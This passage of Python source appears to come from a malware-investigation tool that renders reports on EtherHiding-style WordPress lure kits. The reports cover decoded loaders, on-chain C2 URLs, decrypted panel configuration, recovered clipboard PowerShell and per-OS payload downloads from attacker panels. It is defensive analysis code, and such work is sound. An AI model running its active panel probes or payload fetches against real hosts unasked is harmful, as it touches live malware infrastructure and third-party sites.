        sigs.append("multiple_hex_var_names"); score_mal += 0.3
    # ── Legitimate indicators ──────────────────────────────────────────────
    if re.search(r'\bimport\s*\{[^}]+\}\s*from\s*["\']@wordpress/', body):
        sigs.append("wordpress_module_import"); score_leg += 0.9
    if "@wordpress/interactivity" in bl:
        sigs.append("wordpress_interactivity_api"); score_leg += 0.5
    if re.search(r'\b(jquery|require\(|module\.exports|define\()', body):
        sigs.append("framework_pattern"); score_leg += 0.2
    if "/*! For license information" in body or "*! jQuery" in body or "/**\n * @" in body:
        sigs.append("legitimate_header_comment"); score_leg += 0.3
    # ── Verdict ───────────────────────────────────────────────────────────
    if score_leg >= 0.7 and score_mal < 0.3:
        return {"verdict": "legitimate", "confidence": min(1.0, score_leg),
                "signals": sigs}
    if score_mal >= 0.7 and score_leg < 0.3:
        return {"verdict": "obfuscated", "confidence": min(1.0, score_mal),
                "signals": sigs}
    return {"verdict": "ambiguous",
            "confidence": max(score_mal, score_leg),
            "signals": sigs}


def _fmt_fp_block(fp: dict, p, indent: str = "    ") -> None:
    """Print a server-fingerprint block (used for both lure and panel)."""
    if not fp:
        p(f"{indent}{C.DIM}(no fingerprint){C.RESET}\n"); return
    if fp.get("error"):
        p(f"{indent}error: {fp['error']}\n"); return
    p(f"{indent}host:      {C.CYAN}{fp.get('host')}{C.RESET}\n")
    if fp.get("ips"):
        p(f"{indent}ip(s):     {', '.join(fp['ips'])}\n")
    if fp.get("cname"):
        p(f"{indent}CNAME:     {fp['cname']}\n")
    if fp.get("open_ports"):
        p(f"{indent}open:      {', '.join(map(str, fp['open_ports']))}\n")
    tc = fp.get("tls_cert") or {}
    if tc.get("fingerprint_sha256"):
        p(f"{indent}TLS cert:  {C.DIM}sha256={tc['fingerprint_sha256']}{C.RESET}\n")
        if tc.get("subject", {}).get("commonName"):
            p(f"{indent}           subject CN: {tc['subject']['commonName']}\n")
        if tc.get("issuer", {}).get("commonName"):
            p(f"{indent}           issuer  CN: {tc['issuer']['commonName']}\n")
        if tc.get("not_after"):
            p(f"{indent}           not_after:  {tc['not_after']}\n")
        if tc.get("san"):
            sans = ", ".join(tc["san"][:6])
            extra = f" (+{len(tc['san'])-6} more)" if len(tc['san']) > 6 else ""
            p(f"{indent}           SAN:        {sans}{extra}\n")


def _render_comprehensive_text(report: dict):
    p = sys.stdout.write
    s = report["summary"]
    is_panel = (report.get("mode") == "comprehensive_panel"
                or s.get("input_role") == "panel")
    title = ("COMPREHENSIVE PANEL INVESTIGATION" if is_panel
             else "COMPREHENSIVE IOC INVESTIGATION")
    headline_url = s.get("panel_url") if is_panel else s.get("lure_url")
    p("\n" + C.BOLD + C.CYAN + "═" * 80 + C.RESET + "\n")
    p(f"{C.BOLD}{C.CYAN} {title}{C.RESET}\n")
    p(f"{C.BOLD}{C.CYAN} {headline_url}{C.RESET}\n")
    p(C.BOLD + C.CYAN + "═" * 80 + C.RESET + "\n\n")

    # Show role-classification verdict at the top so the analyst sees why this
    # ran in panel-mode vs lure-mode.
    role = report.get("input_role")
    if role:
        role_color = C.RED if role["role"] == "panel" else (C.GREEN if role["role"] == "lure" else C.YELLOW)
        p(f"  {C.BOLD}>>> ROLE:{C.RESET}  {role_color}{role['role'].upper()}{C.RESET}  "
          f"(confidence {role['confidence']:.2f})  "
          f"{C.DIM}signals: {', '.join(role['signals']) or '(none)'}{C.RESET}\n\n")

    # ── Headline ───────────────────────────────────────────────────────────
    actors = s.get("actors_attributed") or []
    if actors:
        a = actors[0]
        p(f"  {C.BOLD}{C.RED}>>> ATTRIBUTED:{C.RESET}  {C.BOLD}{a['name']}{C.RESET}\n")
        p(f"      contract-match confidence: {C.YELLOW}{a['confidence']}{C.RESET}  ·  "
          f"sources: {C.DIM}{', '.join(a['sources'])}{C.RESET}\n")
        p(f"      {C.DIM}{s.get('actor_attribution_caveat', '')}{C.RESET}\n\n")
    if s.get("resolved_c2"):
        for u in s["resolved_c2"]:
            p(f"  {C.BOLD}{C.RED}>>> LIVE C2 (on-chain):{C.RESET}  {C.GREEN}{u}{C.RESET}\n")
        p("\n")

    # ── Kit CTI background ────────────────────────────────────────────────
    # Authoritative CTI fields from KNOWN_ACTORS (advertised_as / infra /
    # registrar / downstream / victims) shown ONCE here, clearly framed as
    # background knowledge about the kit family — not as observed facts
    # about this specific target. The actor section in each loader block
    # only shows the actual match + confidence + sources.
    if actors:
        # Pull the raw lookup_actor dict for the matched contract so we can
        # surface the background fields (only if they exist on this actor).
        base = report.get("lure_page") or {}
        actor_meta = None
        for g in base.get("groups") or []:
            for c in g.get("classifications") or []:
                aa = c.get("actor_attribution")
                if aa and aa.get("name") == actors[0]["name"]:
                    actor_meta = aa
                    break
            if actor_meta: break
        if actor_meta and any(actor_meta.get(k) for k in
                              ("advertised_as","infra","registrar","downstream","victims","first_seen")):
            p(f"  {C.DIM}{C.BOLD}KIT CTI BACKGROUND{C.RESET}  "
              f"{C.DIM}(from public reports — describes the kit family; NOT verified "
              f"for THIS target){C.RESET}\n")
            for k, label in (("first_seen",    "first_seen"),
                             ("advertised_as", "advertised_as"),
                             ("infra",         "infra"),
                             ("registrar",     "registrar"),
                             ("downstream",    "downstream"),
                             ("victims",       "victim_profile")):
                if actor_meta.get(k):
                    p(f"    {C.DIM}{label:14s}: {actor_meta[k]}{C.RESET}\n")
            p("\n")

    # ── Lure host fingerprint ──────────────────────────────────────────────
    # Heading switches to "PANEL" when the input was classified as a panel
    # (the same fingerprint block is just the input host's TLS/IP/ports).
    fp = report.get("server_fingerprint") or {}
    if fp.get("ip"):
        hdr_label = "PANEL HOST FINGERPRINT" if is_panel else "LURE HOST FINGERPRINT"
        p(f"  {C.BOLD}{hdr_label}{C.RESET}  {C.DIM}({fp.get('host')}){C.RESET}\n")
        _fmt_fp_block(fp, p)
        p("\n")

    # ── Panel host fingerprint (if different host than lure) ───────────────
    pfp = report.get("panel_server_fingerprint")
    if pfp and pfp.get("ip"):
        p(f"  {C.BOLD}{C.MAGENTA}PANEL (C2) HOST FINGERPRINT{C.RESET}  "
          f"{C.DIM}({pfp.get('host')} — from on-chain getURL()){C.RESET}\n")
        _fmt_fp_block(pfp, p)
        p("\n")

    # ── Stack detection ────────────────────────────────────────────────────
    # Labels track the input role. When input is a panel, "LURE" labels become
    # "PANEL" and the panel_cloudflare block is suppressed (its data is in
    # cloudflare directly when in panel mode).
    wp  = report.get("wordpress") or {}
    cf  = report.get("cloudflare") or {}
    pcf = report.get("panel_cloudflare") or {}
    side = "PANEL" if is_panel else "LURE"
    p(f"  {C.BOLD}STACK DETECTION{C.RESET}\n")
    # WordPress
    if wp.get("is_wp"):
        ver = f" v{wp.get('version')}" if wp.get("version") else ""
        sigs = ", ".join(wp.get("signals", [])[:6])
        p(f"    {C.GREEN}{side} is WordPress{C.RESET}{ver}  "
          f"conf={C.BOLD}{wp.get('confidence')}{C.RESET}  "
          f"signals: {C.DIM}{sigs}{C.RESET}\n")
    else:
        p(f"    {side} WordPress:  {C.DIM}not detected{C.RESET}  "
          f"(conf={wp.get('confidence', 0)})\n")
    # Cloudflare for the input side (LURE or PANEL depending on mode)
    def _sig_word(n: int) -> str: return "signal" if n == 1 else "signals"
    if cf.get("behind_cf"):
        ray  = f"  cf_ray={cf.get('cf_ray')}" if cf.get("cf_ray") else ""
        n    = len(cf.get('signals') or [])
        p(f"    {C.YELLOW}{side} behind Cloudflare{C.RESET}{ray}  "
          f"({n} {_sig_word(n)})\n")
        for sig in (cf.get("signals") or [])[:4]:
            p(f"      {C.DIM}- {sig}{C.RESET}\n")
    else:
        p(f"    {side} behind CF:  {C.DIM}not detected{C.RESET}\n")
    # WordPress backdoor probe (only set when WP was detected)
    bd = report.get("wp_backdoor_probe")
    if bd:
        hits = bd.get("hits") or []
        cf_n = bd.get("cf_intercepted_count", 0)
        if hits:
            p(f"    {C.YELLOW}WP backdoor probe{C.RESET}  "
              f"{C.DIM}({len(hits)}/{bd.get('checked')} non-404 responses"
              f"{f'; {cf_n} CF-intercepted' if cf_n else ''}){C.RESET}\n")
            for h in hits[:6]:
                tier = h.get("confidence_tier", "low")
                # Tier colors: high=red (real signal), medium=yellow (ambiguous),
                # cf_intercepted/low=dim (uninformative)
                if h.get("cf_intercepted"):
                    color = C.DIM
                    tier_tag = f"[{C.DIM}cf-intercepted{C.RESET}]"
                elif tier == "high":
                    color = C.RED;  tier_tag = f"[{C.RED}high{C.RESET}]"
                elif tier == "medium":
                    color = C.YELLOW; tier_tag = f"[{C.YELLOW}ambiguous{C.RESET}]"
                else:
                    color = C.DIM;  tier_tag = f"[{C.DIM}low{C.RESET}]"
                p(f"      {tier_tag} {color}HTTP {h['status']}{C.RESET}  {h['path']}  "
                  f"{C.DIM}({h.get('content_type','?')}, {h.get('bytes',0)}B){C.RESET}\n")
                # Only show body excerpts for actually-informative hits — skip
                # the CF interstitials since they just spam the same HTML.
                if h.get("body_head") and not h.get("cf_intercepted"):
                    bh = (h["body_head"] or "")[:120].replace("\n", " ")
                    p(f"        {C.DIM}body[:120]: {bh!r}{C.RESET}\n")
        else:
            p(f"    WP backdoor probe: {C.DIM}no probed paths returned non-404 "
              f"(absence is NOT proof of absence){C.RESET}\n")
        for n in (bd.get("notes") or [])[:4]:
            p(f"      {C.DIM}note: {n}{C.RESET}\n")
    # Panel CF — only show in LURE-mode (when there's a separate panel to report on)
    if not is_panel and pcf and pcf.get("behind_cf"):
        sigs    = pcf.get("signals") or []
        # If --payload ran, we have real HTTP response headers (server, cf-ray,
        # cf-cache-status) — the signal set is richer than just IP/CNAME.
        has_headers = any(s.startswith(("server_header:", "cf_ray_header:",
                                          "cf_header:")) for s in sigs)
        n = len(sigs)
        provenance = ("from --payload init response headers" if has_headers
                      else "IP/CNAME-based; panel not HTTP-fetched here")
        p(f"    {C.YELLOW}PANEL behind Cloudflare{C.RESET}  "
          f"({n} {_sig_word(n)} — {provenance})\n")
        for sig in sigs[:4]:
            p(f"      {C.DIM}- {sig}{C.RESET}\n")
    elif not is_panel and pcf:
        p(f"    PANEL behind CF: {C.DIM}not detected (IP/CNAME only — "
          f"re-check with --payload to read response headers){C.RESET}\n")
    p("\n")

    # ── BW v2 envelope recovery (panel-mode) ──────────────────────────────────
    # When the input is a panel, we probe /api/cfg + /api/settings and AES-GCM
    # decrypt the envelopes using the kit's documented base key. This surfaces
    # the operator's LIVE configuration in plaintext — mode (lure theme),
    # enabled flag, blockBots, rentalExpired — without any active interaction.
    env_rec = report.get("envelope_recovery")
    if env_rec and env_rec.get("responses"):
        p(f"  {C.BOLD}{C.MAGENTA}BW v2 ENVELOPE RECOVERY{C.RESET}  "
          f"{C.DIM}(decrypted /api/cfg + /api/settings — passive AES-GCM){C.RESET}\n")
        ksrc = (env_rec.get("responses") or [{}])[0].get("key_source") or "?"
        p(f"      AES-GCM key source: {C.BOLD}{ksrc}{C.RESET}\n")
        for r in env_rec["responses"]:
            stat = r.get("status"); enc = r.get("enc"); err = r.get("error")
            if r.get("decrypted") is not None:
                p(f"      {C.GREEN}[OK]{C.RESET}   {r.get('action'):8s}  "
                  f"HTTP {stat}  enc={enc}  scope={r.get('scope')}  "
                  f"q={r.get('q_bytes'):,}B  -> decrypted JSON\n")
            else:
                p(f"      {C.YELLOW}[--]{C.RESET}   {r.get('action'):8s}  "
                  f"HTTP {stat}  enc={enc}  -> {C.DIM}{err}{C.RESET}\n")
        # Flat plaintext summary (operator-visible config)
        summ_env = env_rec.get("summary") or {}
        if summ_env:
            p(f"      {C.BOLD}operator config (plaintext):{C.RESET}\n")
            for k in ("mode","enabled","blockBots","rentalExpired","showDelay",
                      "os","browser","panelBaseUrl","apiBase","tokenUrl","downloadUrl"):
                if k in summ_env:
                    p(f"        {k:14s} = {summ_env[k]!r}\n")
        p("\n")

    # ── Inline malicious <script> blocks (the actual obfuscated payload) ──
    base = report.get("lure_page") or {}
    positions = (base.get("page") or {}).get("inline_script_positions") or []
    obf_positions = [pos for pos in positions if pos.get("is_obfuscated")]
    if obf_positions:
        p(f"  {C.BOLD}{C.RED}MALICIOUS INLINE <script> BLOCKS{C.RESET}  "
          f"{C.DIM}(the actual obfuscated loaders — search by line in DevTools){C.RESET}\n")
        for pos in obf_positions:
            p(f"    {C.BOLD}>>>{C.RESET} HTML line {C.BOLD}{pos['line']}{C.RESET}, "
              f"char offset {pos['char_offset']:,}, body {pos['body_size']:,}B\n")
            p(f"        {C.DIM}head: {pos['body_head']!r}{C.RESET}\n")
        p(f"    {C.DIM}Reproduce in browser: open the page, hit Ctrl+U (view source), "
          f"jump to line above.{C.RESET}\n\n")

    # ── External <script src> entries ──────────────────────────────────────
    # Every external script tagged + listed in full. Categorization is for
    # signal — the analyst still gets every URL so they can grep, diff, or
    # paste the path into DevTools and inspect it. Nothing is collapsed.
    inj_srcs = (base.get("page") or {}).get("injected_script_srcs") or []
    if inj_srcs:
        categorized = _categorize_scripts(inj_srcs)
        p(f"  {C.BOLD}{C.MAGENTA}EXTERNAL <script src> ({len(inj_srcs)} total)"
          f"{C.RESET}  {C.DIM}— every external JS loaded by the lure; "
          f"check tagged paths in DevTools{C.RESET}\n")
        # Print suspicious first (most likely the kit's injection point)
        for category, color, urls in [
            ("suspicious",          C.RED,     categorized["suspicious"]),
            ("non-WP-core path",    C.YELLOW,  categorized["non_wp_core"]),
            ("WP core/theme/plugin",C.DIM,     categorized["wp_core"]),
            ("3rd-party analytics", C.DIM,     categorized["analytics"]),
        ]:
            if not urls: continue
            p(f"    {C.BOLD}{color}[{category}]{C.RESET}  {len(urls)}\n")
            for src, note in urls:
                p(f"      {C.BOLD}>{C.RESET} {src}\n")
                if note:
                    p(f"          {C.DIM}{note}{C.RESET}\n")
        p(f"    {C.DIM}Reproduce in browser: open the page, view-source, search "
          f"for `<script src=` to inspect each path's contents.{C.RESET}\n\n")

    # ── Consolidated kit overview (printed ONCE) ───────────────────────────
    # When all loader blocks share the same EtherHiding kit (one contract,
    # one selector, one RPC pool, one actor), print all of that ONCE up
    # front. Per-block then just shows the unique bits (block index, scheme,
    # hash). Reduces the 5-loader-clone wall-of-text by ~80%.
    eh_blocks = []
    for g in base.get("groups", []):
        eh = next((c for c in g.get("classifications", []) if c.get("scheme") == "etherhiding"), None)
        if eh: eh_blocks.append((g, eh))
    consolidated = False
    if len(eh_blocks) >= 2:
        contracts = {tuple(eh.get("contract_addresses") or []) for _, eh in eh_blocks}
        selectors = {eh.get("method_selector") for _, eh in eh_blocks}
        if len(contracts) == 1 and len(selectors) == 1:
            consolidated = True
            _, eh = eh_blocks[0]
            p(f"  {C.BOLD}{C.YELLOW}NEXT-STAGE LOADER OVERVIEW{C.RESET}  "
              f"{C.DIM}(all {len(eh_blocks)} loader blocks resolve to the same "
              f"EtherHiding chain — printed once here){C.RESET}\n")
            p(f"      chain:      {eh.get('chain')}\n")
            for a in (eh.get("contract_addresses") or []):
                tag = ""
                if eh.get("actor_attribution") and \
                   eh["actor_attribution"].get("contract_matched", "").lower() == a.lower():
                    tag = f"   <- {eh['actor_attribution']['name']}"
                p(f"      contract:   {a}{tag}\n")
            sel  = eh.get("method_selector")
            meta = eh.get("selector_info") or {}
            sel_tag = f"   ({meta['signature']})" if meta.get("signature") else ""
            p(f"      selector:   {sel}{sel_tag}\n")
            p(f"      RPC pool:   {len(eh.get('rpc_pool_defanged') or [])} public Polygon endpoints\n")
            if eh.get("resolved", {}).get("ok"):
                r = eh["resolved"]
                p(f"      resolved:   {r.get('decoded_url_defanged')}  "
                  f"{C.DIM}(via {_defang(r.get('rpc_used',''))} @ {r.get('decoded_at')}){C.RESET}\n")
            # Anti-analysis flags from the first block that has them
            for g, _ in eh_blocks:
                aa = next((c for c in g.get("classifications", [])
                            if c.get("scheme") == "antianalysis_gate"), None)
                if aa:
                    if aa.get("debugger_timing"): p(f"      anti-analysis: debugger+timing gate\n")
                    if aa.get("os_device_gate"):  p(f"      anti-analysis: OS/device gate "
                                                    f"(excludes: {', '.join(aa.get('excluded_devices') or [])})\n")
                    if aa.get("dedup_cookies"):   p(f"      anti-analysis: per-victim cookies "
                                                    f"({', '.join(aa.get('dedup_cookies') or [])})\n")
                    break
            p("\n")

    # The decoded loader groups (terse when consolidated, full when not)
    for g in base.get("groups", []):
        idxs = g["block_indexes"]
        idxs_str = (f"#{idxs[0]}" if len(idxs) == 1
                    else f"#{idxs[0]} (+{len(idxs)-1} clones)")
        verd_tag = {"payload": C.GREEN+"[PAYLOAD]"+C.RESET,
                    "next_stage_loader": C.YELLOW+"[NEXT-STAGE LOADER]"+C.RESET,
                    "decoded": "[decoded]", "no_decode": C.DIM+"[no-decode]"+C.RESET}.get(
                       g["verdict"], f"[{g['verdict']}]")
        # In consolidated mode, just emit a 2-line summary per block (scheme +
        # hash) since the contract/selector/RPC/actor/anti-analysis is already
        # in the overview above.
        if consolidated:
            scheme_line = ", ".join(layer["info"][:90] for layer in g["decode_layers"][:1])
            p(f"  {C.BOLD}LOADER BLOCK {idxs_str}{C.RESET}  {verd_tag}  "
              f"hash:{g['group_hash']}\n")
            p(f"      {C.DIM}{scheme_line}{C.RESET}\n\n")
            continue
        p(f"  {C.BOLD}LOADER BLOCK {idxs_str}{C.RESET}  {verd_tag}  hash:{g['group_hash']}\n")
        for layer in g["decode_layers"]:
            p(f"      {C.DIM}{layer['scheme']}:{C.RESET} {layer['info']}\n")
        for cls in g["classifications"]:
            _render_cls_text(cls, p)
        p("\n")

    # ── AES clipboard recovery ─────────────────────────────────────────────
    aes_recs = report.get("aes_clipboard_recovery") or []
    if aes_recs:
        any_ok = any(r.get("ok") for r in aes_recs)
        if any_ok:
            p(f"  {C.BOLD}{C.GREEN}AES CLIPBOARD COMMAND RECOVERED FROM LOADER{C.RESET}\n\n")
            for rec in aes_recs:
                if not rec.get("ok"): continue
                p(f"    {C.BOLD}group {rec['group_hash']}{C.RESET}\n")
                p(f"      key:        {rec['key_b64']}\n")
                p(f"      IV:         {rec['iv_b64']}\n")
                p(f"      CT:         {rec['ct_b64_head']}  ({rec['ct_bytes']} bytes)\n")
                p(f"      plaintext:  {rec['plaintext_bytes']} bytes  "
                  f"sha256={C.DIM}{rec['sha256']}{C.RESET}\n")
                for u in rec.get("urls_in_plaintext_defanged", [])[:4]:
                    p(f"        {C.BOLD}{C.RED}>>> staged URL:{C.RESET} {C.GREEN}{u}{C.RESET}\n")
                pu = rec.get("errtraffic_payload_url")
                if pu:
                    p(f"        panel version: {pu['version']}  ·  role: {pu['role']}\n")
                    tok = (pu.get('token','') or '')[:24]
                    p(f"        params: token={tok}{'…' if pu.get('token') and len(pu['token'])>24 else ''}  "
                      f"mode={pu.get('mode')}  src={pu.get('src')}  os={pu.get('os')}\n")
                p(f"\n      {C.DIM}--- plaintext excerpt (first 8 lines) ---{C.RESET}\n")
                for line in (rec.get("plaintext_excerpt") or "").split("\n")[:8]:
                    p(f"      {C.DIM}{line[:200]}{C.RESET}\n")
                p("\n")
        else:
            for rec in aes_recs:
                p(f"  {C.DIM}AES recovery from this loader: not present  "
                  f"({rec.get('reason')}){C.RESET}\n")
            p(f"  {C.DIM}{s.get('clipboard_aes_caveat','')}{C.RESET}\n\n")

    # Rotation probe (--detect-rotation)
    rp = report.get("rotation_probe")
    if rp:
        meta = rp.get("meta") or {}
        per_os = rp.get("per_os") or {}
        p(f"  {C.BOLD}{C.MAGENTA}ROTATION PROBE{C.RESET}  "
          f"{C.DIM}({rp.get('runs_per_os')} runs/OS against "
          f"{rp.get('panel_url_defanged')}){C.RESET}\n")
        # Column header
        p(f"    {C.DIM}{'OS':9} {'runs':>5} {'distinct AES PS':>17} "
          f"{'distinct decoded':>18} {'distinct tokens':>17}{C.RESET}\n")
        for os_t, r in per_os.items():
            color = (C.YELLOW if r.get("distinct_dl_tokens", 0) > 1 else C.GREEN
                      if r.get("distinct_aes_ps", 0) > 1 else C.DIM)
            p(f"    {color}{os_t:9}{C.RESET} {r.get('n_runs',0):>5} "
              f"{r.get('distinct_aes_ps',0):>17} "
              f"{r.get('distinct_decrypted',0):>18} "
              f"{r.get('distinct_dl_tokens',0):>17}\n")
        if meta.get("interpretation"):
            p(f"    {C.BOLD}finding:{C.RESET}  {meta['interpretation']}\n")
        p("\n")

    # Panel payloads (--payload)
    pp = report.get("panel_payloads")
    if pp:
        meta = pp.get("meta", {})
        successful = meta.get("successful_os") or []
        p(f"  {C.BOLD}{C.MAGENTA}PANEL PAYLOAD DOWNLOAD{C.RESET}  "
          f"({pp.get('panel_url_defanged')})\n")
        if successful:
            # Only render the meta-analysis block if we actually got something
            p(f"    OSes recovered:    {C.GREEN}{', '.join(successful)}{C.RESET}\n")
            if meta.get("failed_os"):
                p(f"    OSes failed:       {C.YELLOW}{', '.join(meta['failed_os'])}{C.RESET}\n")
            p(f"    distinct hashes:   {meta.get('distinct_hashes')}"
              f"  (all-OSes-same-payload? {meta.get('all_same_payload')})\n")
            if meta.get("file_magics"):
                p(f"    file magic types:  {', '.join(meta.get('file_magics', []))}\n")
            if meta.get("size_range"):
                p(f"    size range:        {meta['size_range']['min']:,}..{meta['size_range']['max']:,} bytes\n")
            # Cross-OS uniformity finding — explicitly call out when the operator
            # served the SAME hash to all 4 OS targets. Per Censys/Hudson Rock
            # the kit advertises "per-OS payloads" but operators frequently
            # leave the same binary plumbed for every OS slot in the panel.
            if meta.get("all_same_payload") and len(successful) >= 2:
                magics = meta.get("file_magics", [])
                ftype = magics[0] if len(magics) == 1 else "/".join(magics)
                p(f"    {C.YELLOW}finding:{C.RESET}  operator served the SAME "
                  f"{ftype} hash to all {len(successful)} OS targets — "
                  f"{C.DIM}distinct per-OS payloads NOT configured for this campaign "
                  f"(common: operator plumbed Windows payload into all OS slots){C.RESET}\n")
        else:
            p(f"    {C.RED}No payload recovered for any OS.{C.RESET}  "
              f"{C.DIM}(all four endpoint strategies failed){C.RESET}\n")
            p(f"    {C.DIM}If you can complete the lure's CAPTCHA in your FlareVM browser, "
              f"capture the AES PowerShell from your clipboard, re-run with "
              f"--payload-token <HEX> --payload-src <lure-domain> to retry "
              f"using the real victim-issued token.{C.RESET}\n")
        for os_t, r in pp.get("per_os", {}).items():
            if r.get("sha256"):
                ts = (f"  {C.DIM}via {r.get('token_source','?')}{C.RESET}"
                      if r.get("token_source") else "")
                # Per-OS file-magic mismatch warning (e.g. android slot
                # served a Windows PE — operator misconfiguration finding).
                mm_note = _payload_os_mismatch_note(os_t, r.get("magic") or "")
                p(f"    {C.GREEN}[{os_t:7}]{C.RESET}  "
                  f"{r.get('payload_bytes',0):>10,} B  "
                  f"sha256={C.DIM}{r['sha256']}{C.RESET}  "
                  f"magic={r.get('magic')}  fam={r.get('endpoint_family')}{ts}\n")
                if mm_note:
                    p(f"               {C.YELLOW}{mm_note}{C.RESET}\n")
                # Per-OS saved artifact paths (binary + clipboard + decoded)
                for label, key in (("binary",    "saved_path"),
                                    ("clipboard", "saved_clipboard_path"),
                                    ("decoded",   "saved_decoded_path")):
                    if r.get(key):
                        p(f"               {label:9s}: {C.CYAN}{r[key]}{C.RESET}\n")
                # Surface the parsed stager URL from the decrypted dropper PS —
                # this is the SECOND-STAGE URL the victim's PowerShell hits.
                ird = r.get("init_response_aes_decrypt") or {}
                if ird.get("ok"):
                    ehp = ird.get("errtraffic_payload_url") or {}
                    if ehp.get("token"):
                        p(f"               {C.YELLOW}stager URL{C.RESET}: "
                          f"{ehp.get('host_defanged','?')}{ehp.get('path','')}  "
                          f"{C.DIM}(token={ehp['token'][:24]}…  src={ehp.get('src','?')}  "
                          f"mode={ehp.get('mode','?')}){C.RESET}\n")
                    aes_ps_head = (r.get("init_response_aes_ps") or "")[:140]
                    p(f"               {C.DIM}clipboard PS (AES, sha256={r.get('init_response_aes_ps_sha256','')[:16]}…): "
                      f"{aes_ps_head!r}{C.RESET}\n")
                    pt_head = (ird.get("plaintext") or "")[:140]
                    p(f"               {C.DIM}decrypted PS (sha256={(ird.get('plaintext_sha256') or '')[:16]}…, "
                      f"{ird.get('plaintext_bytes',0)} B): {pt_head!r}{C.RESET}\n")
            else:
                p(f"    {C.RED}[{os_t:7}]{C.RESET}  FAILED — per-strategy diagnostics:\n")
                for att in r.get("token_attempts", []):
                    fam = att.get("family", "?")
                    ph  = att.get("phase",  "?")
                    p(f"      {C.DIM}[{ph}/{fam}]{C.RESET}  {att.get('url','')[:110]}\n")
                    if att.get("status") is not None:
                        ct = att.get('content_type','?')
                        p(f"        HTTP {att['status']}  ct={ct}  -> {att.get('error','')}\n")
                        if att.get("body_excerpt"):
                            be = (att["body_excerpt"] or "")[:160].replace("\n", " ")
                            p(f"        {C.DIM}body[:160]: {be!r}{C.RESET}\n")
                    elif att.get("error"):
                        p(f"        {C.DIM}error: {att['error']}{C.RESET}\n")
        p("\n")

    # ── Final summary ──────────────────────────────────────────────────────
    p(C.BOLD + "─" * 80 + C.RESET + "\n")
    p(f"  {C.BOLD}SUMMARY (collected facts){C.RESET}\n")
    # Label switches based on input role
    input_label = "panel URL" if is_panel else "lure URL"
    input_url   = (s.get("panel_url") if is_panel else s.get("lure_url")) or "(none)"
    p(f"    {input_label:18s}  {input_url}\n")
    # Fetch failure callout — when the lure fetch errored, surface that here
    # so the reader doesn't wonder why the rest of the summary is empty.
    if s.get("fetch_status") == "FAILED":
        p(f"    {C.RED}fetch status:       FAILED{C.RESET}  "
          f"{C.DIM}({s.get('fetch_failure_reason','')}){C.RESET}\n")
        p(f"    {C.DIM}{s.get('site_likely_state','')}{C.RESET}\n\n")
        return
    if s.get("resolved_c2"):
        p(f"    on-chain C2 URL:    {C.GREEN}{', '.join(s['resolved_c2'])}{C.RESET}  "
          f"{C.DIM}(read live from contract; may rotate at any time){C.RESET}\n")
    if s.get("classifications"):
        p(f"    loader classes:     {', '.join(s.get('classifications', []))}\n")
    if s.get("actors_attributed"):
        p(f"    kit (contract-id):  {C.BOLD}{s['actors_attributed'][0]['name']}{C.RESET}  "
          f"{C.DIM}(loader's referenced contract matches a known kit; see CTI background above){C.RESET}\n")
    # Critical IOCs at SUMMARY level — saves the analyst from digging into
    # the loader-block / payload-block detail to find the headline indicators.
    if s.get("contract_addresses"):
        p(f"    contract(s):        {', '.join(s['contract_addresses'])}\n")
    if s.get("method_selectors"):
        p(f"    selector(s):        {', '.join(s['method_selectors'])}\n")
    if s.get("download_tokens"):
        ts = s["download_tokens"]
        n_unique = len(set(ts))
        token_disp = ", ".join(t[:24] + "…" for t in ts[:3])
        suffix = f"  ({n_unique} unique across {len(ts)} OS)" if n_unique > 1 else ""
        p(f"    dl token(s):        {token_disp}{suffix}\n")
    if s.get("distinct_payload_hashes"):
        n = len(s["distinct_payload_hashes"])
        first = s["distinct_payload_hashes"][0]
        p(f"    payload sha256:     {first}"
          f"{f'  (+{n-1} more)' if n > 1 else ''}\n")
    if s.get("distinct_aes_ps_hashes"):
        n_ps  = len(s["distinct_aes_ps_hashes"])
        n_dec = len(s.get("distinct_decrypted_hashes") or [])
        p(f"    clipboard PS:       {n_ps} distinct AES-encrypted variants, "
          f"{n_dec} distinct decrypted plaintexts\n")
    p(f"    {side} WordPress:     {wp.get('is_wp', False)}  "
      f"(conf {wp.get('confidence', 0)})\n")
    p(f"    {side} behind CF:     {cf.get('behind_cf', False)}  "
      f"({len(cf.get('signals') or [])} {_sig_word(len(cf.get('signals') or []))})\n")
    if not is_panel and pcf:
        p(f"    PANEL behind CF:    {pcf.get('behind_cf', False)}  "
          f"({len(pcf.get('signals') or [])} {_sig_word(len(pcf.get('signals') or []))}, IP/CNAME-only)\n")
    aes_ok = s.get('clipboard_aes_recovered', False)
    p(f"    clipboard AES:      {aes_ok}  "
      f"{C.DIM}({'recovered from loader' if aes_ok else 'not in loader — typically delivered by panel at runtime'}){C.RESET}\n")
    if s.get("payload_oses_recovered"):
        p(f"    payloads got:       {', '.join(s['payload_oses_recovered'])}\n")
    # Surface errors (collected during the run)
    errs = report.get("errors") or []
    if errs:
        p(f"    {C.YELLOW}warnings:{C.RESET}\n")
        for e in errs[:6]: p(f"      {C.DIM}- {e[:140]}{C.RESET}\n")
    p("\n")


def _render_contract_investigation_text(report: dict):
    p = sys.stdout.write
    p("\n" + "=" * 80 + "\n")
    p(f" CONTRACT INVESTIGATION : {report['address']}  (chain: {report['chain']})\n")
    p("=" * 80 + "\n")
    if report.get("actor_attribution"):
        a = report["actor_attribution"]
        p(f"\n  >>> ATTRIBUTION:  {a['name']}  (confidence: {a.get('confidence','?')})\n")
        for k in ("kit", "advertised_as", "infra", "registrar", "downstream", "victims",
                  "first_seen", "note"):
            if a.get(k): p(f"        {k}: {a[k]}\n")
        if a.get("sources"): p(f"        sources: {', '.join(a['sources'])}\n")
    bc = report.get("bytecode") or {}
    p(f"\n  bytecode size: {bc.get('size_bytes', '?')} bytes\n")
    p(f"  selectors found in dispatch table: {len(bc.get('selectors_found') or [])}\n")
    for sel in bc.get("selectors_found", []):
        meta = lookup_selector(sel) or {}
        p(f"    {sel}  {meta.get('signature', '(unknown — try 4byte.directory)')}\n")
    if report.get("current_state"):
        p("\n  CURRENT STATE (live readers):\n")
        for sel, st in report["current_state"].items():
            sig = st.get('signature','?')
            if st.get("decoded"):
                p(f"    {sel} {sig}  =  {st.get('decoded_defanged') or st['decoded']}\n")
            elif st.get("error"):
                p(f"    {sel} {sig}  -> ERROR: {st['error']}\n")
            else:
                p(f"    {sel} {sig}  -> (no decoded value)\n")
    hist = report.get("history") or []
    if hist:
        p(f"\n  TRANSACTION HISTORY ({len(hist)} txs; scanned {report.get('scanned_blocks','?')} blocks):\n")
        p(f"  {'time':25} {'block':>10}  {'fn':<18} {'param':<40}\n")
        for h in hist[:50]:
            t = str(h.get("block_time") or "?")
            b = h.get("block_number") or 0
            f = h.get("function") or "?"
